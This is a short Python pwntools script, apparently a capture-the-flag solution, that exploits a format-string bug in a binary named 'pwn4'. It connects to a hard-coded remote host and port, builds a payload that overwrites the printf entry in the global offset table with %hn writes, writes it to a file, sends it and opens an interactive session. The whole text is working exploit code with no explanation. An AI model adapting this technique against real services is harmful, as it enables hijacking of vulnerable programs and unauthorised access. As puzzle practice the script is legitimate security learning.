#!/usr/bin/env python2
from pwn import *

HOST = "104.154.106.182"
PORT = 5678
local = True
local = False
if local:
    p = process("./pwn4")
else:
    p = remote(HOST,PORT)

elf = ELF("./pwn4")
got_printf = elf.got["printf"]
log.info("printf is at {} in got".format(hex(got_printf)))
payload = p32(got_printf)
payload += p32(got_printf+1)
payload += p32(got_printf+2)
payload += p32(got_printf+3)
payload += "%{}x%7$hn".format(0xdd-len(payload))
payload += "%{}x%8$hn".format(0x1a7)
payload += "%{}x%9$hn".format(0x180)
payload += "%{}x%10$hn".format(0x304)
open("payload","wb").write(payload)
p.sendline(payload)
p.interactive()
